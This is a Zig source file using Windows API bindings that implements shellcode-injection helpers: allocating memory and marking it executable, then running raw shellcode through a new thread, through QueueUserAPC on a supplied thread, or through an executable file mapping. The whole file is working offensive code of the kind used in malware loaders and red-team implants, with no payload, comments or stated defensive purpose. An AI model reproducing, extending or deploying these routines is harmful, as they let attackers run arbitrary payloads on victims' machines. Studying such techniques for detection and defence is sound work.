const std = @import("std");
const win = @import("zigwin32").everything;

const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const LPTHREAD_START_ROUTINE = win.LPTHREAD_START_ROUTINE;
const INFINITE = win.INFINITE;
const SECURITY_ATTRIBUTES = win.SECURITY_ATTRIBUTES;
const HANDLE = win.HANDLE;
const INVALID_HANDLE_VALUE = win.INVALID_HANDLE_VALUE;

const VirtualAlloc = win.VirtualAlloc;
const VirtualProtect = win.VirtualProtect;
const VirtualFree = win.VirtualFree;
const CreateThread = win.CreateThread;
const CloseHandle = win.CloseHandle;
const WaitForSingleObject = win.WaitForSingleObject;
const QueueUserAPC = win.QueueUserAPC;
const GetLastError = win.GetLastError;
const CreateFileMappingA = win.CreateFileMappingA;
const MapViewOfFile = win.MapViewOfFile;

pub fn allocateMemory(data: []const u8) !*anyopaque {
    const region = VirtualAlloc(
        null,
        data.len,
        .{ .COMMIT = 1, .RESERVE = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAlloc Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocFailed;
    };
    @memcpy(@as([*]u8, @ptrCast(region)), data);

    return region;
}

pub fn allocateExecutableMemory(data: []const u8) !*anyopaque {
    const region = try allocateMemory(data);

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtect(
        region,
        data.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectFailed;
    }

    return region;
}

pub fn freeVirtualMemory(region: *anyopaque) void {
    _ = VirtualFree(region, 0, .RELEASE);
}

pub fn executeInNewThread(start_address: LPTHREAD_START_ROUTINE, parameter: ?*anyopaque) !void {
    const h_thread = CreateThread(
        null,
        0,
        start_address,
        parameter,
        .{},
        null,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };
    defer _ = CloseHandle(h_thread);

    _ = WaitForSingleObject(h_thread, INFINITE);
}

pub fn injectShellCodeToProcess(shell_code: []const u8) !void {
    const shell_code_region = try allocateExecutableMemory(shell_code);
    defer _ = freeVirtualMemory(shell_code_region);

    try executeInNewThread(@ptrCast(shell_code_region), null);
}

pub fn injectShellCodeViaApc(h_thread: HANDLE, shell_code: []const u8) !void {
    const shell_code_region = try allocateExecutableMemory(shell_code);

    if (QueueUserAPC(@ptrCast(shell_code_region), h_thread, 0) == 0) {
        std.debug.print("[!] QueueUserAPC Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.QueueUserAPCFailed;
    }
}

pub fn mapInject(shell_code: []const u8) !*anyopaque {
    const h_file = CreateFileMappingA(
        INVALID_HANDLE_VALUE,
        null,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        0,
        @intCast(shell_code.len),
        null,
    ) orelse {
        std.debug.print("[!] CreateFileMappingA Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateFileMappingAFailed;
    };
    defer _ = CloseHandle(h_file);

    const map_address = MapViewOfFile(
        h_file,
        .{ .WRITE = 1, .EXECUTE = 1 },
        0,
        0,
        @intCast(shell_code.len),
    ) orelse {
        std.debug.print("[!] MapViewOfFile failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.MapViewOfFilefailed;
    };
    @memcpy(@as([*]u8, @ptrCast(map_address)), shell_code);

    return map_address;
}
